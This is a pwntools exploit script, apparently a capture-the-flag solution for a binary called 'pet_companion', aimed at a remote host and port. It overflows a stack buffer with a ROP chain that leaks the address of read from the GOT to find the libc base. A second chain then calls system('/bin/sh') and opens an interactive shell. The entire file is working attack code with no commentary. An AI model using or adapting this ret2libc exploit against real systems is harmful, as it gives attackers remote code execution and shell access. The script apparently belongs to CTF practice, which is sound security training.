from pwn import *

if args.LOCAL:
    io = process('./pet_companion')
    if args.GDB:
        cmd = """
        b* 0x0000000000400649
        """
        gdb.attach(io, cmd)
else:
    io =remote('94.237.48.205', 54752)
elf=ELF('./pet_companion')
libc=ELF('./glibc/libc.so.6')


pause()

pop_rdi = 0x0000000000400743
pop_rsi = 0x0000000000400741

pl = b'8'*64+p64(0) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(elf.got.read) + p64(0) +p64(elf.plt.write) + p64(0x00000000040064A)
io.send(pl)
sleep(0.1)

io.recvline()
io.recvline()
io.recvline()
io.recvline()
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym.read

print(hex(libc.address))

pl = b'8'*64+p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
io.send(pl)
io.interactive()